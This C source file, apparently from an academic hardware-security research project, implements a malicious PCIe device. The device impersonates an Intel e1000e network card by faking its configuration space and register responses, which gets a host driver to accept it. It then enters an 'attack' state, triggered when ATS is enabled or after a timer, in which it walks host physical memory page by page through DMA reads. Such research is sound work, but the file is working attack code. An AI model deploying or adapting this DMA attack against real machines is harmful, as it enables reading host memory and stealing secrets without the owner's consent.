/*-
 * SPDX-License-Identifier: BSD-2-Clause
 * 
 * Copyright (c) 2015-2018 Colin Rothwell
 * 
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory under DARPA/AFRL contract FA8750-10-C-0237
 * ("CTSRD"), as part of the DARPA CRASH research programme.
 * 
 * We acknowledge the support of EPSRC.
 * 
 * We acknowledge the support of Arm Ltd.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdint.h>
#include <stdio.h>

#include "mask.h"
#include "hexdump.h"
#include "hw/pci/pci_regs.h"
#include "hw/pci/pcie_regs.h"
#include "pcie.h"
#include "pcie-backend.h"
#include "qemu/bswap.h"
#include <time.h>

static inline uint16_t
uint16_min(uint16_t left, uint16_t right)
{
	return (left < right) ? left : right;
}

static inline uint64_t
get_page_address(uint64_t address)
{
	return (address & ~uint64_mask(12));
}

int
read_page(uint64_t address, uint32_t devfn, uint8_t* buffer)
{
	const int CHUNK_SIZE = 256;
	int i, read_result = 0;
	uint64_t page_address = get_page_address(address);
	for (i = 0; i < 4096; i += CHUNK_SIZE) {
		read_result = perform_dma_read((buffer + i), CHUNK_SIZE, devfn, 0,
			(page_address + i));
		if (read_result != 0) {
			break;
		}
	}
	return read_result;
}

int
print_page_at_address(uint64_t address, uint32_t devfn)
{
	int read_result;
	uint8_t page_data[4096];

	read_result = read_page(address, devfn, page_data);

	if (read_result == -1) {
		printf("UR trying read page.\n");
		return read_result;
	}

	printf("0x%lx\n", get_page_address(address));
	hexdump(page_data, 4096);

	return read_result;
}

enum attack_state {
	AS_UNINITIALISED,
	AS_READING
};

enum packet_response {
	PR_NO_RESPONSE, PR_RESPONSE
};

struct packet_response_state {
	uint32_t devfn;
	uint32_t config_space[1024];
	uint32_t eeprom_reg;
	uint32_t mdic_reg;
	uint32_t semaphore_reg;
	enum attack_state attack_state;
};

void
initialise_e1000e_config_space(uint32_t config_space[1024])
{
	for (int i = 0; i < 1024; ++i) {
		config_space[i] = 0;
	}
#define C(A, V) config_space[(A) / 4] = (V)
	/* vendor and device id */
	C(0x000, 0x10d38086);
	config_space[0] = 0x10d38086;
	/* status | command */
	C(0x004, (PCI_STATUS_CAP_LIST << 16));
	/* class code | revision id */
	C(0x008, 0x02000000);
	/* BAR 2: IO */
	C(0x018, 1);
	/* Capabilities pointer */
	C(0x034, 0xC8);
	/* MSI-X Capability Structure */
	C(0x0A0, (0x90 << 16) | (0x11));
	/* Power management register block */
	C(0x0C8, ((0x1 << 5 | 0x2) << 16) | (0xE0 << 8) | 0x01);
	/* PCI Express Capability structure dword[0] */
	/* These are basically just version identifiers */
	          /* cap reg | next ptr    | cap id */
	C(0x0E0, (0x2 << 16) | (0xA0 << 8) | 0x10);
	/* Device Capapbilities Register */
	C(0x0E4, 0x1); /* 256 bytes max payload size. */
	/* Device control register. */
	/* Maybe need to set bit 4 to enable relaxed ordering.
	 * Maybe need to set bit 11: enable no snoop.
	 * See page 615. */
	/* Max payload 256 bytes again. */
	/* Max read request size 256 bytes. */
	/* May need to set transactions pending in device status register. */
	/*C(0x0E8, (0x1 << 12) | (0x1 << 5));*/
	/* Link capability */
	/* Commented to match QEMU */
	C(0x0EC, /* (0x6 << 15) | (0x1 << 12) | */  (0x1 << 10) | (0x1 << 4) | 0x1);
	/* Link control and status */
	C(0xF0, (/* (0x1 << 12) | */ (0x1 << 4) | 0x1) << 16);
	/* ATS capability: dword [0] */
	/*C(0x100, PCI_EXT_CAP(PCI_CAP_ID_ATS, PCI_ATS_VERSION, 0x0));*/
	/* ATS capability: dword[1] */
	/*C(0x104, PCI_ATS_PAGE_ALIGNED_REQUEST);*/
#undef C
}

static uint32_t
mask_for_byte_enable(uint32_t be)
{
	uint32_t mask = 0;
	for (int i = 0; i < 4; ++i) {
		if (((be >> i) & 1)) {
			mask |= (0xFF << (i * 8));
		}
	}
	return mask;
}

enum packet_response
respond_to_packet(struct packet_response_state *state,
	struct RawTLP *in, struct RawTLP *out)
{
	uint16_t requester_id;
	uint32_t mask, write_data, phy_reg, eeprom_addr;
	uint64_t req_addr;
	enum packet_response response = PR_NO_RESPONSE;
	struct TLP64DWord0 *dword0 = (struct TLP64DWord0 *)in->header;
	struct TLP64RequestDWord1 *request_dword1 =
		(struct TLP64RequestDWord1 *)(in->header + 1);
	struct TLP64ConfigRequestDWord2 *config_request_dword2 =
		(struct TLP64ConfigRequestDWord2 *)(in->header + 2);

	enum tlp_direction dir = get_tlp_direction(in);

	requester_id = request_dword1->requester_id;

	switch (dword0->type) {
	case CFG_0:
		if ((config_request_dword2->device_id & uint32_mask(3)) != 0) {
			printf("Don't like device_id: %x.\n",
				config_request_dword2->device_id);
			break;
		}

		state->devfn = config_request_dword2->device_id;
		response = PR_RESPONSE;
		req_addr = get_config_req_addr(in);

		if (dir == TLPD_READ) {
			out->data_length = 4;
			out->data[0] = bswap32(state->config_space[req_addr / 4]);
			/*printf("Reading addr: 0x%03lx. Non-endian: 0x%08x. Final: 0x%08x.\n",*/
				/*req_addr, state->config_space[req_addr / 4],*/
				/*out->data[0]);*/
		} else /* (dir == TLPD_WRITE) */ {
			mask = mask_for_byte_enable(request_dword1->firstbe);
			switch (req_addr) {
			case 0x000:
			case 0x004:
			case 0x00C:
			case 0x020: /* BAR 4 */
			case 0x024: /* BAR 5 */
				mask = 0;
				break;
			case 0x10: /* BAR 0: Memory */
				mask &= uint32_mask_enable_bits(31, 17);
				break;
			case 0x14: /* BAR 1: Flash */
				mask &= uint32_mask_enable_bits(31, 16);
				break;
			case 0x18: /* BAR 2: IO */
				mask &= uint32_mask_enable_bits(31, 5);
				break;
			case 0x1C: /* BAR 3: MSI-X */
				mask &= uint32_mask_enable_bits(31, 14);
				break;
			case 0x104:
				if (bswap32(in->data[0]) & (1 << 31)) {
					printf("ATS set enabled!\n");
					state->attack_state = AS_READING;
				}
				break;
			}
			write_data = (bswap32(in->data[0]) & mask) |
				(state->config_space[req_addr / 4] & ~mask);
			state->config_space[req_addr / 4] = write_data;
			out->data_length = 0;
		}

		out->header_length = 12;
		create_completion_header(out, dir, state->devfn,
			TLPCS_SUCCESSFUL_COMPLETION, 4, requester_id, request_dword1->tag,
			0);

		break;
	case CPL:
		printf("Got CPL ");
		if (in->data_length > 0) {
			printf("with data[0] 0x%x.\n", in->data[0]);
		} else {
			printf("without data.\n");
		}
		break;
	case M:
		req_addr = in->header[2] & uint64_mask(17);
		/*printf("Mem %s: 0x%lx.\n", dir == TLPD_READ ? "Read" : "Write",*/
			/*req_addr);*/
		if (dir == TLPD_READ) {
			response = PR_RESPONSE;
			out->data_length = 4;
			switch (req_addr) {
			case 0x14:
				out->data[0] = bswap32(state->eeprom_reg | (1 << 1));
				break;
			case 0x20: /* Always set ready bit. */
				out->data[0] = bswap32(state->mdic_reg | (1 << 28));
				break;
			case 0xF00:
				out->data[0] = bswap32(state->semaphore_reg);
				break;
			case 0x5400: /* MAC Recv addr low */
				out->data[0] = bswap32(0x00000200);
				break;
			default:
				out->data[0] = 0;
				break;
			}
			out->header_length = 12;
			create_completion_header(out, dir, state->devfn,
				TLPCS_SUCCESSFUL_COMPLETION, 4, requester_id,
				request_dword1->tag, 0);
		} else /* (dir == TLPD_WRITE) */ {
			switch (req_addr) {
			case 0x14:
				eeprom_addr = (bswap32(in->data[0]) &
					uint32_mask_enable_bits(15, 2)) >> 2;
				/* Checksum reg */
				switch (eeprom_addr) {
				case 0x1: /* First 16 bits of MAC addr */
					state->eeprom_reg = 0x2 << 16;
					break;
				case 0x3F:
					state->eeprom_reg = (0xBABA - 0x2) << 16;
					break;
				default:
					state->eeprom_reg = 0;
				}
				break;
			case 0x20: /* Set this because FreeBSD checks address. */
				state->mdic_reg = bswap32(in->data[0]) & ~0xFFFF;
				phy_reg = (state->mdic_reg >> 16) & 0x1F;
				if (phy_reg == 2) {
					state->mdic_reg |= 0x0141;
				} else if (phy_reg == 3) {
					state->mdic_reg |= 0x0CB1;
				}
				break;
			case 0xF00:
				state->semaphore_reg = bswap32(in->data[0]);
				break;
			}
		}
		break;
	default:
		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(dword0->type),
			dword0->type);
		break;
	}
	return response;
}

int
main(int argc, char *argv[])
{
	int send_result, read_result;
	TLPQuadWord tlp_in_quadword[32];
	TLPQuadWord tlp_out_header[2];
	TLPQuadWord tlp_out_data[16];
	struct RawTLP raw_tlp_in;
	struct RawTLP raw_tlp_out;
	raw_tlp_out.header = (TLPDoubleWord *)tlp_out_header;
	raw_tlp_out.data = (TLPDoubleWord *)tlp_out_data;

	enum packet_response response;

	struct packet_response_state packet_response_state = {
		.attack_state = AS_UNINITIALISED,
		.semaphore_reg = 0
	};
	initialise_e1000e_config_space(packet_response_state.config_space);

	uint64_t read_addr, next_read_addr = 0x0;
	uint8_t read_buffer[4096];

	int init = pcie_hardware_init(argc, argv, &physmem);
	if (init) {
		puts("Problem initialising PCIE core.");
		return init;
	}

	long start_seconds = -1;
	struct timespec time;

	drain_pcie_core();
	puts("PCIe Core Drained. Let's go.");



	/* The rule of thumb I wanted whilst writing this was that the card only
	 * makes one DMA request/response before checking if the card has data for
	 * it.
	 *
	 * However, a lot of what I want to do is iterating through various
	 * collections of data items. This means that this is a while loop
	 * consisting of a number of what are essentially unrolled for loops.
	 */

	while (1) {
		wait_for_tlp(tlp_in_quadword, sizeof(tlp_in_quadword), &raw_tlp_in);
		clock_gettime(CLOCK_UPTIME_FAST, &time);

		if (is_raw_tlp_valid(&raw_tlp_in)) {
			response = respond_to_packet(&packet_response_state,
				&raw_tlp_in, &raw_tlp_out);
			if (response != PR_NO_RESPONSE) {
				send_result = send_tlp(&raw_tlp_out);
				assert(send_result != -1);
			}

			if (start_seconds == -1) {
				printf("Started counting.\n");
				start_seconds = time.tv_sec;
			}

			continue;
		}

		if (start_seconds != -1 && (time.tv_sec - start_seconds) > 120) {
			packet_response_state.attack_state = AS_READING;
		}

		switch (packet_response_state.attack_state) {
		case AS_UNINITIALISED:
			break;
		case AS_READING:
			read_result = perform_dma_read(read_buffer, 8,
				packet_response_state.devfn, 0, next_read_addr);
			printf("Trying %lx... ", next_read_addr);
			read_addr = next_read_addr;
			next_read_addr += 4096;
			if (read_result == -1) {
				printf("Fail.\n");
			} else {
				printf("Fine!\n");
				/*hexdump(read_buffer, 256);*/
			}
			break;
		}
	}
	
	puts("Quitting main loop.");
}
